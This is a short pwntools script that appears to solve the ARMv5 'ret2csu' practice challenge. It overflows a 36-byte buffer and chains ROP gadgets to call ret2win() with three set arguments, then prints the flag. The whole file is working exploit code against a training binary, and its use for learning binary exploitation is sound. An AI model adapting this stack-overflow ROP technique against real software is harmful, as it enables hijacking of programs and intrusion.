#!/usr/bin/puthon3
from pwn import process, p32, log

shell = process("./ret2csu_armv5")

offset = 36
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0x10474)    # pop {r3, pc};
payload += p32(0x10498)    # ret2win()
payload += p32(0x10644)    # pop {r4, r5, r6, r7, r8, sb, sl, pc}
payload += p32(0x0) * 3    # padding for pops
payload += p32(0xdeadbeef) # arg1
payload += p32(0xcafebabe) # arg2
payload += p32(0xd00df00d) # arg3
payload += p32(0x0)        # padding for pop
payload += p32(0x1062c)    # mov r2, sb; mov r1, r8; mov r0, r7; blx r3;

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
